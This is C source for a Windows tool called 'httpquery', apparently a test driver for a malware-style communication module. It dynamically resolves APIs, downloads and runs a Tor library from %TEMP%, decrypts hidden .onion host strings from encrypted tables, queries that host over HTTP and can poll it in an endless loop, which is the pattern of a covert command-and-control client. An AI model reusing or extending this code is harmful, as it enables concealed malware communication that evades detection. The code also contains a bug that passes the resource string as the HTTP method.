#include "compat.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <libgen.h>

#include "crypt.h"
#include "crypt_strings.h"
#include "http.h"


typedef struct opts {
    bool dl_libtor:1;
    bool on_doloop:1;
    char* on_host;
    char* on_res;
    char* on_meth;
} opts_t;

static void usage(char* arg0)
{
    printf("usage: %s [-h] [-l] [-d HOST] [-r RESOURCE] [-m METHOD]\r\n"
                        "\t-h\tthis\r\n"
                        "\t-l\tdownload/run libtor\r\n"
                        "\t-p\tenter dll http loop\r\n"
                        "\t-d\tdestination onion host\r\n"
                            "\t\t\te.g. something.onion\r\n"
                        "\t-r\thttp resource\r\n"
                            "\t\t\te.g. /uri?paramN=valueN\r\n"
                        "\t-m\thttp method\r\n"
                            "\t\t\te.g. GET\r\n"
                        "\r\n", arg0);
}

static void parse_opts(int argc, char** argv, opts_t* po)
{
    int opt;

    if (!po) return;
    while ((opt = getopt(argc, argv, "hlpd:r:m:")) != -1) {
        switch (opt) {
            case 'h':
                usage(argv[0]);
                exit(1);
            case 'l':
                po->dl_libtor = true;
                break;
            case 'p':
                po->on_doloop = true;
                break;
            case 'd':
                po->on_host = strdup(optarg);
                break;
            case 'r':
                po->on_res = strdup(optarg);
                break;
            case 'm':
                po->on_meth = strdup(optarg);
                break;
            default:
                printf("Unknown option: %d\r\n", opt);
                break;
        }
    }
}

int main(int argc, char** argv)
{
    opts_t o;
    const char* arg0 = "httpquery";
    void* loadlib = LoadLibraryA;
    void* getproc = GetProcAddress;

    if (!bInitCompat(LoadLibraryA("KERNEL32.dll"), getproc))
        return -1;

    memset(&o, 0, sizeof(o));
    parse_opts(argc, argv, &o);

    COMPAT(printf)("LoadLibraryA.....: 0x%p\r\n", loadlib);
    COMPAT(printf)("GetProcAddress...: 0x%p\r\n", getproc);

    if (initHttp(loadlib, getproc) != 0) {
        COMPAT(printf)("%s: initHttp(...) failed\r\n", arg0);
        return 1;
    }

    /* download libtor and save it to %TEMP%\libonion.dll */
    if (o.dl_libtor) {
        COMPAT(printf)("%s: download libtor\r\n", arg0);
        int ret;
        char* libPath = NULL;
        if ((ret = downloadLibtor(&libPath)) != ERR_HTTP_OK) {
            COMPAT(printf)("%s: libtor download failed with %d (GetLastError: %u/0x%X)\r\n", arg0, ret, (unsigned)GetLastError(), (unsigned)GetLastError());
        } else {
            COMPAT(printf)("%s: libtor: %s\r\n", arg0, libPath);
            HMODULE libmod = NULL;
            tor_main_t tm = loadLibtor(libPath, &libmod, LoadLibraryA, GetProcAddress);
            COMPAT(printf)("%s: libmod: %p, tormain: %p\r\n", arg0, libmod, tm);
            /* run tor main loop */
            tm(59050, 0xdeadc0de);
        }
        if (libPath)
            COMPAT(free)(libPath);
    }

    struct http_args hArgs = {0};

#ifdef _HTTP_LOCALHOST
    DBUF(HTTP_HOST_LOCAL_ENUM, __hosts);
    char __onion[1] = {0};
#else
    DBUF(HTTP_HOSTS_ENUM, __hosts);
    DBUF(HTTP_ONION_ENUM, __onion);
#endif

    char* cur = NULL;
    char* end = NULL;
    get_string_in_strings_di(__hosts, 0, &cur, &end);

    size_t hostLen = strlen(__onion) + strlen(cur);
    char host[hostLen+1];
    snprintf(&host[0], hostLen+1, cur, __onion);

    hArgs.host        = (o.on_host != NULL ? o.on_host : host);
    hArgs.hostLen     = strlen(hArgs.host);
    hArgs.resource    = (o.on_res != NULL ? o.on_res : "/");
    hArgs.resourceLen = strlen(hArgs.resource);
    hArgs.method      = (o.on_meth != NULL ? o.on_res : "GET");
    hArgs.methodLen   = strlen(hArgs.method);

    rrbuff out    = NULL;
    rrsize outSiz = 0;
    DWORD status = 0;
    int ret = sendHttpRequest(&hArgs, &out, &outSiz, &status);
    switch (ret) {
        case 0:
            COMPAT(printf)("Success: %u\r\n", (unsigned)status);
            break;
        default:
            COMPAT(printf)("Error: %d (GetLastError: %u/0x%X)\r\n", ret, (unsigned)GetLastError(), (unsigned)GetLastError());
            break;
    }

    if (out && outSiz > 0)
        COMPAT(printf)("Website content (Status %d, Size: %u):\n%s\r\n", (int)status, (unsigned)outSiz, out);

    if (o.on_doloop) {
        printf("Enter HTTP Loop ..\n");
        while (1) {
            httpLoopAtLeastOnce();
            sleep(20);
        }
    }

    if (o.on_host) free(o.on_host);
    if (o.on_meth) free(o.on_meth);
    if (o.on_res) free(o.on_res);
    return ret;
}
